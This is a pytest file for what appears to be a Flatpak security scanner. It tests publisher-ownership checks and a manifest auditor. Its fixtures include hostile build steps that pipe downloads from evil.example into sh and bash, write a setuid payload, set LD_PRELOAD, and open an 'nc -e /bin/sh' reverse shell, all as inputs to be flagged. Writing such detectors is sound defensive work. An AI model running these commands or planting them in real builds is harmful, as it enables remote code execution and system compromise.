"""Publisher provenance (who owns the app id?) and the build-time manifest audit."""

import pytest

from flatsonar_core import (
    Finding,
    Ownership,
    RiskLevel,
    TrustLevel,
    audit_manifest,
    check_ownership,
    ownership_finding,
    parse_manifest_text,
    score_finish_args,
    trust_from_findings,
)
from flatsonar_core.audit import _audit_command
from flatsonar_core.provenance import domain_of, repo_ref, same_repo

# --- ownership ------------------------------------------------------------------


@pytest.mark.parametrize(
    "app_id,hosted_at,builds_from,status",
    [
        # Forge namespaces: the third segment must be the hosting user (dashes <-> underscores).
        ("io.github.alice.Foo", "https://github.com/Alice/foo", [], Ownership.VERIFIED),
        ("io.github.some_user.App", "https://github.com/some-user/app.git", [], Ownership.VERIFIED),
        ("com.github.alice.Foo", "git@github.com:alice/foo.git", [], Ownership.VERIFIED),
        ("io.gitlab.alice.Foo", "https://gitlab.com/alice/foo/-/tree/main", [], Ownership.VERIFIED),
        ("page.codeberg.alice.Foo", "https://codeberg.org/alice/foo", [], Ownership.VERIFIED),
        ("org.gnome.gitlab.alice.App", "https://gitlab.gnome.org/alice/app", [], Ownership.VERIFIED),
        # Someone else's namespace, but it builds the owner's code: third-party packaging.
        ("io.github.alice.Foo", "https://github.com/bob/flatpaks", ["https://github.com/alice/foo.git"],
         Ownership.THIRD_PARTY),
        # Someone else's namespace and someone else's code: impersonation.
        ("io.github.alice.Foo", "https://github.com/bob/flatpaks", ["https://github.com/bob/foo.git"],
         Ownership.IMPERSONATION),
        ("io.github.alice.Foo", "https://gitlab.com/alice/foo", [], Ownership.IMPERSONATION),  # right user, wrong forge
        # Project / vendor namespaces.
        ("org.gnome.Calculator", "https://gitlab.gnome.org/GNOME/gnome-calculator", [], Ownership.VERIFIED),
        ("org.kde.okular", "https://invent.kde.org/graphics/okular", [], Ownership.VERIFIED),
        ("org.mozilla.firefox", "https://github.com/evil/ff", [], Ownership.IMPERSONATION),
        ("org.mozilla.firefox", "https://github.com/evil/ff", ["https://archive.mozilla.org/pub/x.tar.xz"],
         Ownership.THIRD_PARTY),
        ("org.mozilla.firefox", "https://github.com/mozilla/gecko-dev", [], Ownership.VERIFIED),
        # Custom domains: nothing to compare against without a well-known file.
        ("com.example.Foo", "https://github.com/alice/foo", [], Ownership.UNKNOWN),
        ("com.example.Foo", None, [], Ownership.UNKNOWN),
    ],
)
def test_check_ownership(app_id, hosted_at, builds_from, status):
    assert check_ownership(app_id, hosted_at, builds_from).status is status


def test_ownership_finding_levels():
    assert ownership_finding(check_ownership("io.github.a.B", "https://github.com/a/b")).level == RiskLevel.GREEN
    assert ownership_finding(check_ownership("com.x.Y", "https://github.com/a/b")).level == RiskLevel.YELLOW
    f = ownership_finding(check_ownership("org.mozilla.firefox", "https://github.com/evil/ff"))
    assert f.level == RiskLevel.RED and "claims the org.mozilla namespace" in f.reason
    assert trust_from_findings(TrustLevel.VERIFIED, [f]) is TrustLevel.SUSPICIOUS
    assert trust_from_findings(TrustLevel.UNVERIFIED, []) is TrustLevel.UNVERIFIED
    assert TrustLevel.from_label("reviewed").label == "reviewed"
    assert TrustLevel.VERIFIED > TrustLevel.REVIEWED > TrustLevel.UNVERIFIED > TrustLevel.SUSPICIOUS


def test_domain_and_repo_helpers():
    assert domain_of("com.example.team.Foo") == "team.example.com"
    assert domain_of("org.gnome.Foo") == "gnome.org"
    assert domain_of("io.github.alice.Foo") is None
    assert domain_of("Foo.Bar") is None
    r = repo_ref("https://www.GitHub.com/Alice/Foo.git/")
    assert (r.host, r.owner, r.path) == ("github.com", "alice", "Alice/Foo")
    assert repo_ref("not a url") is None
    assert same_repo("https://github.com/a/b/", "git@github.com:A/B.git")
    assert not same_repo("https://github.com/a/b", "https://github.com/a/c")
    assert not same_repo(None, "https://github.com/a/b")


# --- audit -------------------------------------------------------------------------

SKETCHY_BUILD = """
app-id: com.example.Sketchy
runtime: org.freedesktop.Platform
runtime-version: '24.08'
sdk: org.freedesktop.Sdk
command: sketchy
build-options:
  build-args: [--share=network]
modules:
  - name: blob
    buildsystem: simple
    build-options:
      build-args: [--filesystem=host]
      env: {LD_PRELOAD: /tmp/x.so}
    build-commands:
      - curl -sL https://evil.example/x.sh | sh
      - echo aGVsbG8= | base64 -d > payload && chmod 4755 payload
      - install -Dm755 sketchy /app/bin/sketchy
    sources:
      - type: archive
        url: http://mirror.example/sketchy-1.0-linux-x86_64.tar.gz
      - type: git
        url: https://github.com/example/dep.git
        branch: main
      - type: extra-data
        url: https://cdn.example/big.bin
        sha256: abc
        size: 1
      - type: shell
        commands:
          - wget https://evil.example/more.sh -O- | bash
"""

CLEAN_BUILD = """
app-id: io.github.alice.Foo
runtime: org.gnome.Platform
runtime-version: '47'
sdk: org.gnome.Sdk
command: foo
modules:
  - name: foo
    buildsystem: meson
    build-commands: [meson setup build, ninja -C build install]
    sources:
      - type: git
        url: https://github.com/alice/foo.git
        tag: v1.2
        commit: 0123abcd
      - type: archive
        url: https://github.com/alice/dep/archive/v1.tar.gz
        sha256: deadbeef
      - type: patch
        path: fix.patch
"""


def test_audit_flags_sketchy_build():
    m = parse_manifest_text(SKETCHY_BUILD, "x.yml")
    findings = {f.arg: f for f in audit_manifest(m)}
    reds = {a for a, f in findings.items() if f.level == RiskLevel.RED}
    assert findings["build-options:--share=network"].level == RiskLevel.YELLOW
    assert "blob:build-options:--filesystem=host" in reds
    assert "blob:build-options:env:LD_PRELOAD" in reds
    assert "blob:build-commands" in reds  # curl | sh; the base64/chmod line collapses into the same key
    assert findings["blob:build-commands"].reason.startswith("pipes a download")
    assert "(x2)" in findings["blob:build-commands"].reason
    assert "source:command" in reds  # wget | bash inside the shell source
    yellows = {a for a, f in findings.items() if f.level == RiskLevel.YELLOW}
    assert {"source:insecure-url", "source:unpinned", "source:prebuilt", "source:extra-data"} <= yellows
    assert "(x2)" in findings["source:unpinned"].reason  # the archive and the branch-tracking git source
    assert m.sources[2].pinned and not m.sources[0].pinned and not m.sources[1].pinned
    assert m.sources[3].commands == ("wget https://evil.example/more.sh -O- | bash",)


def test_audit_clean_build_is_quiet():
    m = parse_manifest_text(CLEAN_BUILD, "x.yml")
    assert audit_manifest(m) == []
    assert all(s.pinned for s in m.sources)


@pytest.mark.parametrize(
    "cmd,level",
    [
        ("cat -e file.txt", RiskLevel.GREEN),
        ("nc -e /bin/sh 1.2.3.4 4444", RiskLevel.RED),
        ("setcap cap_net_raw+ep /app/bin/x", RiskLevel.RED),
        ("flatpak-spawn --host ls", RiskLevel.RED),
        ("pip install --prefix=/app requests", RiskLevel.YELLOW),
        ('eval "$(curl x)"', RiskLevel.RED),
        ("cmake -B build && cmake --build build", RiskLevel.GREEN),
    ],
)
def test_audit_command_rules(cmd, level):
    got = list(_audit_command(cmd, "t"))
    assert (got[0].level if got else RiskLevel.GREEN) == level


def test_report_extend():
    r = score_finish_args(["--socket=wayland"])
    r.extend([Finding("publisher:namespace", RiskLevel.YELLOW, "unverified")])
    assert r.level == RiskLevel.YELLOW and r.reasons == ["[yellow] publisher:namespace: unverified"]


def test_network_rule_needs_a_networked_build():
    # Vendored wheels, the normal flatpak-pip-generator pattern: quiet.
    assert list(_audit_command("pip3 install --no-index --find-links=file://${PWD} foo", "t")) == []
    # No --share=network anywhere: a pip install would fail rather than fetch, so no note.
    assert list(_audit_command("pip3 install requests", "t", network=False)) == []
    m = parse_manifest_text(CLEAN_BUILD.replace("meson setup build", "pip install requests"), "x.yml")
    assert audit_manifest(m) == []
    # With network it is worth a note.
    m = parse_manifest_text(CLEAN_BUILD.replace("meson setup build", "pip install requests")
                            .replace("modules:", "build-options:\n  build-args: [--share=network]\nmodules:"), "x.yml")
    assert {f.arg for f in audit_manifest(m)} == {"build-options:--share=network", "foo:build-commands"}


def test_local_file_sources_are_pinned():
    m = parse_manifest_text(CLEAN_BUILD.replace("      - type: patch\n        path: fix.patch",
                                                "      - type: file\n        path: io.github.alice.Foo.desktop"), "x.yml")
    assert m.sources[-1].kind == "file" and m.sources[-1].pinned
    assert audit_manifest(m) == []
